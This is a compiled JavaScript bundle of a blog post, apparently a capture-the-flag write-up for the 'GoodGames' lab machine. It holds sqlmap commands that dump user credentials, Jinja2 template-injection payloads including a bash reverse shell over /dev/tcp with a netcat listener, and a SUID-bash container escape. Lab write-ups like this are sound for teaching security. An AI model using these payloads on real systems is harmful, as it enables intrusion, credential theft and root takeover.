"use strict";(self.webpackChunkmy_blog=self.webpackChunkmy_blog||[]).push([[677],{2197:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-g-16-b7a6ca6d404905a3de370767b7d77959.png"},2329:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-g-3-8ddec9f638f40155c2cfce60b335ca99.png"},2447:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-g-5-14f9524c6351ec8b2949c6aabdb1699a.png"},3313:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-g-619aec147bcca7992c4a856afd59376d.png"},4979:(e,t,a)=>{a.r(t),a.d(t,{assets:()=>r,contentTitle:()=>l,default:()=>c,frontMatter:()=>s,metadata:()=>o,toc:()=>p});var n=a(8168),i=(a(6540),a(5680));const s={},l=void 0,o={permalink:"/Blog/blog/GoodGames",editUrl:"https://github.com/danae-pan/Blog/blog/GoodGames.md",source:"@site/blog/GoodGames.md",title:"GoodGames",description:"Task 1",date:"2025-04-04T21:17:12.938Z",formattedDate:"April 4, 2025",tags:[],readingTime:4.885,truncated:!1,authors:[],prevItem:{title:"Jerry",permalink:"/Blog/blog/Jerry"},nextItem:{title:"Cap",permalink:"/Blog/blog/Cap"}},r={authorsImageUrls:[]},p=[{value:"Task 1",id:"task-1",children:[]},{value:"Task 2",id:"task-2",children:[]}],g={toc:p},d="wrapper";function c(e){let{components:t,...s}=e;return(0,i.yg)(d,(0,n.A)({},g,s,{components:t,mdxType:"MDXLayout"}),(0,i.yg)("h3",{id:"task-1"},"Task 1"),(0,i.yg)("p",null,"Submit User Flag"),(0,i.yg)("p",null,"We use nmap to find the services on the target machine and we see that an apache server runs on port 80."),(0,i.yg)("p",null,(0,i.yg)("inlineCode",{parentName:"p"},"nmap -sV target_ip")),(0,i.yg)("p",null,(0,i.yg)("img",{alt:"alt text",src:a(3313).A})),(0,i.yg)("p",null,"Navigating to the browser we see a login page where we will try bypassing the authentication using SQL injection."),(0,i.yg)("p",null,"Server-Side Template Injection (SSTI) vulnerability arises when an application incorporates user-supplied input directly into its server-side templates without proper sanitization or validation. Template engines, which combine templates with dynamic data to generate web pages, can be exploited through SSTI attacks."),(0,i.yg)("p",null,"To find forms that are candidates for sql injection run"),(0,i.yg)("p",null,(0,i.yg)("inlineCode",{parentName:"p"},'sqlmap -u "http://10.129.51.14/" --forms --crawl=2 --dbms=mysql')),(0,i.yg)("p",null,"--crawl=CRAWLDEPTH: crawls the website starting from the target url"),(0,i.yg)("p",null,"We find a total of 8 targets. One of the identified forms is the login form and sqlmap auto-filled blank fields, tried multiple techniques and identified that the email field is vulnerable to time-based blind SQL injection."),(0,i.yg)("p",null,(0,i.yg)("img",{alt:"alt text",src:a(2329).A})),(0,i.yg)("p",null,(0,i.yg)("img",{alt:"alt text",src:a(2447).A})),(0,i.yg)("p",null,"After confirming the vulnerability we want to enumerate the database and find the table storing the usernames and passwords to get the user flag."),(0,i.yg)("p",null,"We can try running the following command to retrieve the databse names."),(0,i.yg)("p",null,(0,i.yg)("inlineCode",{parentName:"p"},'sqlmap -u "http://10.129.51.14/login" --data="email=*&password=test123" --dbs')),(0,i.yg)("p",null,"We found 2 available databases named information_schema and main."),(0,i.yg)("p",null,"Next, we will list the tables from each."),(0,i.yg)("p",null,(0,i.yg)("inlineCode",{parentName:"p"},'sqlmap -u "http://10.129.51.14/login" --data="email=*&password=test123/login" -D <database_name> --tables')),(0,i.yg)("p",null,"Starting with the database named main, we find 3 tables blog, blog_comments and user and which we can further investigate.\nWe start with the table user."),(0,i.yg)("p",null,(0,i.yg)("inlineCode",{parentName:"p"},'sqlmap -u "http://10.129.51.14/login" --data="email=*&password=test123/login" -D main -T user --columns')),(0,i.yg)("p",null,"There, we find 4 columns in total with a column named email and a column name password that might get us the flags we need."),(0,i.yg)("p",null,(0,i.yg)("img",{alt:"alt text",src:a(5283).A})),(0,i.yg)("p",null,"We then run the following command to retreive that information."),(0,i.yg)("p",null,(0,i.yg)("inlineCode",{parentName:"p"},'sqlmap -u "http://10.129.51.14/login" --data="email=*&password=test123/login" -D main -T user -C email,password --dump')),(0,i.yg)("p",null,"We find the email and the password and with those credentials we login after we use a hash cracker to find the plain texts password from the hashed one."),(0,i.yg)("p",null,"Now that we are logged in as admin, we can see a gear on the top right that redirects as to internal-administration.goodgames.htb. We need to edit the /etc/hosts file to point this domain to the target machine's IP.\nNote, editing the hosts file requires administrative privileges."),(0,i.yg)("p",null,"Following the url, we see a login page:\n",(0,i.yg)("img",{alt:"alt text",src:a(6179).A})),(0,i.yg)("p",null,"There we reuse the credentials that we found on the previous step, where admin is the username.\nWe are presented with a dashborad for the admin."),(0,i.yg)("p",null,(0,i.yg)("img",{alt:"alt text",src:a(6045).A})),(0,i.yg)("p",null,"After we are in we attempt to find a palce where sql injection is possible. Navigating to the settings page,\nwe see the general information where we can try sql injection on the field of the full name.\nWe try the usual test of ' OR 1=1 --- and we see this renders as the full name. We then try {{1+1}} for Jinja2 (Python) and we see this results to two,\nso we confirm SSTI (Server Side Template Injection) which can lead to an RCE.\nNow we can go on with jinja2 exploitation. "),(0,i.yg)("p",null,"First we open a port locally:"),(0,i.yg)("p",null,(0,i.yg)("inlineCode",{parentName:"p"},"nc -lvnp 4343")),(0,i.yg)("p",null,"Different ways using some python libraries to exploit including:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre"},"{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}\n{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}\n{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}\n")),(0,i.yg)("p",null,"Or in the shotest versions:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre"},"{{ cycler.__init__.__globals__.os.popen('id').read() }}\n{{ joiner.__init__.__globals__.os.popen('id').read() }}\n{{ namespace.__init__.__globals__.os.popen('id').read() }}\n")),(0,i.yg)("p",null,"We used\n",(0,i.yg)("inlineCode",{parentName:"p"},"{{ cycler.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/<local_ip>/<exposed_port> 0>&1\"').read() }}")),(0,i.yg)("p",null,"We now got the root control of the server"),(0,i.yg)("p",null,(0,i.yg)("img",{alt:"alt text",src:a(9320).A})),(0,i.yg)("p",null,"We can then navigate to /home/augustus where we find the user.text, in which the user flag is user flag is located."),(0,i.yg)("h3",{id:"task-2"},"Task 2"),(0,i.yg)("p",null,"But since we are already a root user but not finding any root.txt under the /root directory, we might be inside a container."),(0,i.yg)("p",null,"We can invistigate the cgroup file under the proc folder that contains all processes."),(0,i.yg)("p",null,(0,i.yg)("img",{alt:"alt text",src:a(6446).A})),(0,i.yg)("p",null,"From this file, we understand that we are inside a docker container. So, we need to access the host from the container which is known as container escape or breakout."),(0,i.yg)("p",null,"One way of container gaining access to host file systems, is if they areconfigured to run with the SYS_ADMIN capability which allows\ncontainers to perform actions through the linux kernel that would be available only to root users on a linux server."),(0,i.yg)("p",null,"capa=",(0,i.yg)("inlineCode",{parentName:"p"},"cat /proc/1/status | grep -i 'CapEff' | awk '{print $2}'"),"; capsh --decode=$capa"),(0,i.yg)("p",null,"grep CapEff /proc/$$/status"),(0,i.yg)("p",null,"CapEff this set represents all the capabilities the process is using at a specific moment in time.\nThen we need to decode the permitted capcbility using capsh."),(0,i.yg)("p",null,(0,i.yg)("inlineCode",{parentName:"p"},"capsh -- decode=xxxxxx00000000a80425fb")),(0,i.yg)("p",null,(0,i.yg)("img",{alt:"alt text",src:a(2197).A})),(0,i.yg)("p",null,"After decoding, we see that the cap_sys_admin capability is not there, so we cannot use this to escape the container."),(0,i.yg)("p",null,"We then can try ssh to the host machine using the username augustus and the password we had before found for the admin\n",(0,i.yg)("inlineCode",{parentName:"p"},"ssh augustus@172.19.0.1")),(0,i.yg)("p",null,"And it works! "),(0,i.yg)("p",null,"Since the container mounts /home/augustus from the host anything the container writes in this directory, is also visible on the host and vice versa."),(0,i.yg)("p",null,"Having said that we can follow the next steps to create a SUID-root bash binary on the host via a shared volume.\nWhile in the host we copy the /bin/bash to the current dirrectory ",(0,i.yg)("inlineCode",{parentName:"p"},"cp /bin/bash ."),".\nThen inside the container we can:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre"},"chown root:root /home/augustus/bash\nchmod 4777 /home/augustus/bash\n")),(0,i.yg)("p",null,"Now going back to host, we run ",(0,i.yg)("inlineCode",{parentName:"p"},"./bash -p")," to get a root shell and finally get the root flag."),(0,i.yg)("p",null,(0,i.yg)("img",{alt:"alt text",src:a(6171).A})),(0,i.yg)("p",null,"What is blind SQL injection?"),(0,i.yg)("p",null,"Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.\nMany techniques as UNION attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the inkected query within the application's responses."))}c.isMDXComponent=!0},5283:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-g-9-708f4e42c7a8b057b1491a527b02dd4c.png"},6045:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-g-11-847dbb40ceb4806ac34aceaa816cb947.png"},6171:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-g-18-0ec48d0f47799d25b3a8ea8d10dc55c4.png"},6179:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-g-10-3bbc2422ba2194b241164d73cc3cc2df.png"},6446:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-g-15-4d8c36c0f79ff0d58fa5290d320af8ae.png"},9320:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-g-13-8fe182bc64b3755a649dfde16e3292a3.png"}}]);